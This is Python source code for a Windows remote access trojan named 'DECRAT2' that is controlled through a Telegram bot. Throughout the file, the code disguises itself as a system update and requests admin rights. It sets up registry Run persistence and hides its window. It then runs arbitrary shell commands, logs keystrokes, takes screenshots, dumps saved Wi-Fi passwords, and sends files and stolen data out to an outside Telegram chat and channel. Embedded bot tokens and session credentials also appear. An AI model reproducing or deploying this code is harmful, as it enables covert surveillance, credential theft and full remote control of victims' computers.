# DECRAT2 — Telegram C2
# pyinstaller --onefile --noconsole --uac-admin --collect-all telethon --name="svchost_update" agent_tg.py

import requests, time, subprocess, os, sys, platform, threading, ctypes, winreg

# ══════════════════════════════════════════════════════════════
BOT_TOKEN      = "9210089363:AAEIbLdw_XzM7cibtONb3FhqKjnNWE3798s"
CHAT_ID        = "7505093216"
API_ID         = "38629347"
API_HASH       = "470efaf92b578908891104d8ed7229ac"
SESSION_STRING = "1BVtsOL8Bu2Plt56Af6mbUDKBYpCmLL5CXVakwazjl1rg043Y62t2RPBeI7F_XuL969pXKE31wHkK-vvwGFvTlLO0XH_5obvfZZ5i7O8oiDNrDsyWuJEUydzfExp-UpIP1LgUFZLr3aTu9cnb9WAaBMw-6pAa_UiMEXKISA_eAwSeytB2SU8wTUzwLEDyhAAlJp5EAYAfU9LoPxcocGebMmu69j7TcmXRUgLddJtlmwLcDf_fPx9JIJGRudOlsq-_j3RivblDkg6_EVOJtCuPXP9f9kbVXmeJIcidNCbRigvIO9yA_NbudCk4PrX3nCxcAWAmrJ_A3WuWJbjSJR55DR_C5cm1hrc="
CHANNEL        = "@decrat_sending"
# ══════════════════════════════════════════════════════════════

POLL_INTERVAL  = 3
API_URL        = f"https://api.telegram.org/bot{BOT_TOKEN}"
last_update_id = 0
kl_buf         = []
kl_running     = False

def single_instance():
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\DecRat2_v2_mutex")
    if ctypes.windll.kernel32.GetLastError() == 183:
        sys.exit(0)

def hide():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.FreeConsole()
    except: pass

def ensure_admin():
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False
    if not is_admin:
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable,
                " ".join(f'"{a}"' for a in sys.argv),
                None, 0
            )
        except: pass
        sys.exit(0)

def install_persist():
    exe  = sys.executable
    name = "WindowsSecurityUpdate"
    try:
        k = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, name, 0, winreg.REG_SZ, exe)
        winreg.CloseKey(k)
        return "✅ persisted (HKLM)"
    except: pass
    try:
        k = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, name, 0, winreg.REG_SZ, exe)
        winreg.CloseKey(k)
        return "✅ persisted (HKCU)"
    except Exception as e:
        return f"❌ {e}"

def tg_send(text):
    try:
        for i in range(0, len(text), 4000):
            requests.post(f"{API_URL}/sendMessage", json={
                "chat_id":    CHAT_ID,
                "text":       text[i:i+4000],
                "parse_mode": "HTML"
            }, timeout=10)
    except: pass

def tg_send_file(filepath, caption=""):
    try:
        with open(filepath, "rb") as f:
            requests.post(f"{API_URL}/sendDocument",
                data={"chat_id": CHAT_ID, "caption": caption},
                files={"document": f}, timeout=120)
        return True
    except:
        return False

def tg_get_updates():
    global last_update_id
    try:
        r = requests.get(f"{API_URL}/getUpdates", params={
            "offset":          last_update_id + 1,
            "timeout":         2,
            "allowed_updates": ["message"]
        }, timeout=10)
        return r.json().get("result", [])
    except:
        return []

def flush_old_updates():
    try:
        r = requests.get(f"{API_URL}/getUpdates", params={
            "offset":  -1,
            "timeout":  2
        }, timeout=10)
        results = r.json().get("result", [])
        if results:
            return results[-1]["update_id"]
    except: pass
    return 0

def channel_upload(filepath, caption=""):
    try:
        from telethon.sync import TelegramClient
        from telethon.sessions import StringSession
        with TelegramClient(
            StringSession(SESSION_STRING), int(API_ID), API_HASH
        ) as client:
            client.send_file(
                CHANNEL, filepath,
                caption=caption or os.path.basename(filepath)
            )
        return True
    except ImportError as e:
        tg_send(f"❌ telethon not bundled: {e}"); return False
    except Exception as e:
        tg_send(f"❌ channel error: {e}"); return False

def smart_send(filepath, caption=""):
    try:
        mb = os.path.getsize(filepath) / (1024 * 1024)
        if mb < 45:
            ok = tg_send_file(filepath, f"{caption} ({mb:.1f}MB)")
            if not ok:
                tg_send(f"📤 bot failed, trying channel...")
                channel_upload(filepath, caption)
        else:
            tg_send(f"📤 {mb:.1f}MB → {CHANNEL}...")
            ok = channel_upload(filepath, caption)
            if ok:  tg_send(f"✅ check {CHANNEL}")
            else:   tg_send(f"❌ upload failed")
    except Exception as e:
        tg_send(f"❌ smart_send: {e}")

def run_shell(cmd):
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=30,
            creationflags=0x08000000
        )
        return (r.stdout + r.stderr).strip() or "[no output]"
    except subprocess.TimeoutExpired: return "[timeout]"
    except Exception as e:            return f"[error: {e}]"

def screenshot():
    try:
        import struct as st
        g = ctypes.windll.gdi32
        u = ctypes.windll.user32
        w = u.GetSystemMetrics(0); h = u.GetSystemMetrics(1)
        hS = u.GetDC(None);  hD = g.CreateCompatibleDC(hS)
        hB = g.CreateCompatibleBitmap(hS, w, h)
        g.SelectObject(hD, hB)
        g.BitBlt(hD, 0, 0, w, h, hS, 0, 0, 0x00CC0020)
        class BIH(ctypes.Structure):
            _fields_ = [
                ("biSize",ctypes.c_uint32),("biWidth",ctypes.c_int32),
                ("biHeight",ctypes.c_int32),("biPlanes",ctypes.c_uint16),
                ("biBitCount",ctypes.c_uint16),("biCompression",ctypes.c_uint32),
                ("biSizeImage",ctypes.c_uint32),("biXPelsPerMeter",ctypes.c_int32),
                ("biYPelsPerMeter",ctypes.c_int32),("biClrUsed",ctypes.c_uint32),
                ("biClrImportant",ctypes.c_uint32)
            ]
        bih = BIH(); bih.biSize = ctypes.sizeof(BIH)
        bih.biWidth = w; bih.biHeight = -h; bih.biPlanes = 1
        bih.biBitCount = 24; bih.biCompression = 0
        row = ((w*3+3)&~3); bih.biSizeImage = row*h
        buf = (ctypes.c_byte * bih.biSizeImage)()
        g.GetDIBits(hD, hB, 0, h, buf, ctypes.byref(bih), 0)
        hdr = 14 + ctypes.sizeof(BIH)
        bmp = st.pack("<2sIHHI",b"BM",hdr+bih.biSizeImage,0,0,hdr)+bytes(bih)+bytes(buf)
        g.DeleteObject(hB); g.DeleteDC(hD); u.ReleaseDC(None, hS)
        path = os.path.join(os.environ.get("TEMP","C:\\Windows\\Temp"), "ss.bmp")
        open(path, "wb").write(bmp)
        return path
    except: return None

def sysinfo():
    try:    admin = "✅ Admin" if ctypes.windll.shell32.IsUserAnAdmin() else "❌ User"
    except: admin = "?"
    return (f"🖥 <b>SYSTEM INFO</b>\n"
            f"OS:   {platform.system()} {platform.version()}\n"
            f"Host: {platform.node()}\n"
            f"User: {os.environ.get('USERNAME','?')}\n"
            f"Arch: {platform.machine()}\n"
            f"Priv: {admin}")

def kl_start():
    global kl_running
    if kl_running: return "already running"
    kl_running = True
    def _r():
        u  = ctypes.windll.user32
        vm = {0x20:" ",0x0D:"[ENTER]",0x08:"[BS]",0x09:"[TAB]",0x1B:"[ESC]"}
        while kl_running:
            for vk in list(range(0x30, 0x5B)) + list(vm.keys()):
                if u.GetAsyncKeyState(vk) & 0x0001:
                    kl_buf.append(vm.get(vk, chr(vk)))
            time.sleep(0.01)
    threading.Thread(target=_r, daemon=True).start()
    return "✅ keylogger started"

def handle(text):
    t = text.strip()
    if t in ("/start", "/help"):
        return ("📋 <b>Commands</b>\n\n"
                "/ping\n/sysinfo\n/screenshot\n"
                "/shell &lt;cmd&gt;\n"
                "/download &lt;path&gt;\n"
                "/channel &lt;path&gt;\n"
                "/keylog_start | /keylog_dump | /keylog_stop\n"
                "/persist\n/ip\n/wifi\n/ps\n/users")
    elif t == "/ping":
        return f"🟢 alive — {platform.node()}"
    elif t == "/sysinfo":
        return sysinfo()
    elif t == "/screenshot":
        p = screenshot()
        if p: smart_send(p, "📸 screenshot"); return None
        return "❌ screenshot failed"
    elif t.startswith("/shell "):
        cmd = t[7:]
        return f"<code>{cmd}</code>\n\n{run_shell(cmd)}"
    elif t.startswith("/download "):
        p = t[10:].strip()
        if not os.path.exists(p): return f"❌ not found: {p}"
        smart_send(p, f"📁 {os.path.basename(p)}"); return None
    elif t.startswith("/channel "):
        p = t[9:].strip()
        if not os.path.exists(p): return f"❌ not found: {p}"
        mb = os.path.getsize(p) / (1024*1024)
        tg_send(f"📤 {os.path.basename(p)} ({mb:.1f}MB) → {CHANNEL}...")
        ok = channel_upload(p, f"📁 {os.path.basename(p)}")
        return f"✅ check {CHANNEL}" if ok else "❌ failed"
    elif t == "/keylog_start": return kl_start()
    elif t == "/keylog_dump":
        d = "".join(kl_buf); kl_buf.clear()
        return f"<b>Keylog:</b>\n<code>{d or '[empty]'}</code>"
    elif t == "/keylog_stop":
        kl_running = False; return "⏹ stopped"
    elif t == "/persist":
        return install_persist()
    elif t == "/ip":
        return run_shell("ipconfig /all")
    elif t == "/wifi":
        p = run_shell("netsh wlan show profiles")
        names = [l.split(":")[-1].strip()
                 for l in p.split("\n") if "All User Profile" in l]
        r = ""
        for n in names:
            pw = run_shell(f'netsh wlan show profile name="{n}" key=clear')
            for l in pw.split("\n"):
                if "Key Content" in l:
                    r += f"{n}: {l.split(':')[-1].strip()}\n"
        return r or "no saved passwords"
    elif t == "/ps":
        return run_shell("tasklist")
    elif t == "/users":
        return run_shell("net user")
    return None

def main():
    single_instance()
    ensure_admin()
    hide()

    global last_update_id
    time.sleep(2)

    last_update_id = flush_old_updates()

    tg_send(f"🟢 Agent connected\n{sysinfo()}\n📡 {CHANNEL}")

    while True:
        try:
            for upd in tg_get_updates():
                last_update_id = upd["update_id"]
                msg = upd.get("message", {})
                if str(msg.get("chat", {}).get("id", "")) != str(CHAT_ID):
                    continue
                text = msg.get("text", "")
                if not text: continue
                resp = handle(text)
                if resp:
                    tg_send(resp)
        except Exception:
            pass
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    main()
